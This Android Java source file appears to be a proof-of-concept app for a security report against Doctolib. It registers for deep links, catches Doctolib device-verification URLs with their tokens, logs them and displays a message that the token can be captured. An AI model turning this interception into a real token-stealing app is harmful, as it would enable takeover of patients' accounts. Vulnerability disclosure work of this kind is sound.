package com.frpoc;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import android.util.Log;

public class MainActivity extends Activity {

    private static final String TAG = "DoctolibPOC";
    private TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // SIMPLE FIX: Create and keep reference to TextView
        textView = new TextView(this);
        textView.setTextSize(16);
        textView.setPadding(50, 50, 50, 50);
        setContentView(textView);

        Log.d(TAG, "MainActivity started");

        // Handle initial intent
        handleIntent(getIntent());
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Log.d(TAG, "New intent received");
        handleIntent(intent);
    }

    private void handleIntent(Intent intent) {
        if (intent != null && Intent.ACTION_VIEW.equals(intent.getAction())) {
            Uri data = intent.getData();
            if (data != null) {
                String url = data.toString();
                Log.d(TAG, "Intercepted URL: " + url);

                String message = "🚨 DOCTOLIB URL INTERCEPTED\n\n" +
                        "URL: " + url + "\n\n" +
                        "Security Impact: CRITICAL\n" +
                        "Device verification token can be captured";

                // SAFE: Use our direct reference
                textView.setText(message);
            }
        } else {
            // Not a deep link - show default message
            textView.setText("Doctolib POC App\n\nApp is ready to intercept:\nhttps://www.doctolib.fr/account/devices_verification/");
        }
    }
}